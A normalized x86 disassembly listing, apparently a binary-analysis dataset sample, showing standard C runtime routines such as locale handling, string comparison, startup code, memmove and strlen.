jmp r-xdata
sub_4102dc
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41033f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_40f402#2
pop ecx
sub_410301
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_411260
lea edi [ eax + 0x1 ]
push edi
call sub_40f43a
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_415be1
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_410368
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_41686e
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_415ebb
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_41623d
mov [ esi + 0x4 ] eax
sub_4103f0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410483
add esp 0xc
pop ebp
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov eax 0x7fffffff
pop ebp
retn
push ebx
push esi
push edi
push 0x41
pop edi
push 0x5a
sub edx ecx
pop ebx
mov esi eax
cmp ax bx
ja r-xdata
add ecx 0x2
test si si
je r-xdata
cmp ax bx
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop edi
pop esi
sub eax ecx
pop ebx
pop ebp
retn
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax di
jb r-xdata
movzx eax [ edx + ecx ]
cmp ax di
jb r-xdata
sub_410483
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push [ ebp + 0x10 ]
call sub_410368
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
mov edx 0x7fffffff
jmp r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
pop ebx
je r-xdata
mov eax [ ebp - 0x10 ]
push edi
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_416685
movzx edi ax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
lea ebx [ ebx + 0x2 ]
call sub_416685
add esp 0x10
movzx eax ax
lea esi [ esi + 0x2 ]
test di di
je r-xdata
push 0x41
pop ecx
push 0x5a
sub ebx esi
pop edx
movzx edx di
movzx eax ax
sub edx eax
pop edi
cmp di ax
je r-xdata
mov edi eax
cmp ax dx
ja r-xdata
add esi 0x2
test di di
je r-xdata
cmp ax dx
ja r-xdata
add eax 0x20
movzx edi ax
jmp r-xdata
cmp di ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ esi ]
cmp ax cx
jb r-xdata
movzx eax [ ebx + esi ]
cmp ax cx
jb r-xdata
jmp r-xdata
sub_41055c
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_410368
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_412060
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_416b3c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_416a8d
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_416d6c
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41069d
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41055c
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_4106c9
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_412060
push 0x16
pop esi
mov [ eax ] esi
call sub_412224
mov eax esi
jmp r-xdata
call sub_41592b
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ esi ] eax
push eax
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call [ AreFileApisANSI@IAT ]
test eax eax
jne r-xdata
add eax eax
push eax
call sub_411b1b
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_41203f
xor ebx ebx
inc ebx
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
push eax
call sub_41203f
push [ esi ]
call sub_40f402
and [ esi ] 0x0
pop ecx
jmp r-xdata
pop ecx
sub_410779
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_4107fb
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4170b1
push r--data
push r--data
call sub_4108f4
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_416fc0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_416dd0
call sub_40f3c3
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_416fc0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4108a0
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_411a93
push esi
call sub_4121ec
push esi
call sub_41201f
push esi
call sub_417160
push esi
call sub_41717a
push esi
call sub_41714f
add esp 0x18
pop esi
jmp sub_415969
sub_4108d8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_4108f4
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_410928
push 0x1c
push r--data
call sub_411bb0
push 0x8
call sub_416df0
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410a42
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_411bf5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_416f54
pop ecx
push [ ebp + 0x8 ]
call sub_4107ab
push r--data
push r--data
call sub_4108d8
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_4108d8
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_410a6b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40f402
pop ecx
sub_410a89
push 0x14
push r--data
call sub_411bb0
call sub_41590a
movzx esi ax
push 0x2
call sub_4178d1
pop ecx
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
mov [ ebp - 0x1c ] ebx
call sub_4120b4
test eax eax
jne r-xdata
xor ebx ebx
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_4169a8
test eax eax
jne r-xdata
push 0x1c
call sub_410bd9
cmp [ eax + r--data ] ebx
setne bl
call sub_416db0
and [ ebp - 0x4 ] 0x0
call sub_414682
test eax eax
jns r-xdata
push 0x10
call sub_410bd9
call [ GetCommandLineW@IAT ]
mov [ rw-data ] eax
call sub_4179b8
mov [ rw-data ] eax
call sub_4175b6
test eax eax
jns r-xdata
push 0x1b
call sub_410bd9
call sub_4177ef
test eax eax
jns r-xdata
push 0x8
call sub_4107c1
push 0x1
call sub_4107fb
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_4107c1
call sub_417a13
push esi
push eax
push 0x0
push __dos_header
call sub_401fbf
mov esi eax
mov [ ebp - 0x24 ] esi
test ebx ebx
jne r-xdata
push eax
call sub_4107c1
call sub_4107ec
jmp r-xdata
push esi
call sub_410a57
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_411bf5
retn
sub_410c10
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_4110e4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_410fe8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4110e4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_410e5c ]
jmp [ ecx * 4 + jump_table_410edc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410f48 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4110e4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_410f48 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4110e4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4110e4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4110e4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410f48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_410f48 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_410f48 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_411260
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4112eb
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_411378
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4113ab
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4113e1
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_411417
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_411450
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40eb9e
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_4186f2
add esp 0x20
pop esi
pop ebp
retn
sub_411481
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40eb9e
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_4186f2
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
